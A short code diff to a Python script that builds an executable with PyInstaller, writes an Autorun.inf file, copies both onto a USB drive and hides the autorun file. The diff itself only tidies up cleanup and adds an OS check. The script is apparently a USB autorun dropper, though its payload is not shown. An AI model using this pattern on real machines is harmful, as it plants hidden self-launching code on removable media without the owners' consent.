@@ -23,10 +23,11 @@ PyInstaller.__main__.run([
 
 # Clean up after Pyinstaller
 shutil.move(os.path.join(pwd,"dist",exename),pwd)
-shutil.rmtree("dist")
-shutil.rmtree("build")
-shutil.rmtree("__pycache__")
-os.remove(exename+".spec")
+for d in ["dist","build","__pycache__"]:
+    if os.path.exists(d):
+        shutil.rmtree(d)
+if os.path.isfile(exename+".spec"):
+    os.remove(exename+".spec")
 
 # Create Autorun File
 with open("Autorun.inf","w") as o:
@@ -39,4 +40,5 @@ with open("Autorun.inf","w") as o:
 # Move files to USB and set to hidden
 shutil.move(exename,usbdir)
 shutil.move("Autorun.inf",usbdir)
-os.system("attrib +h "+os.path.join(usbdir,"Autorun.inf"))
+if os.name == 'nt':
+    os.system("attrib +h "+os.path.join(usbdir,"Autorun.inf"))
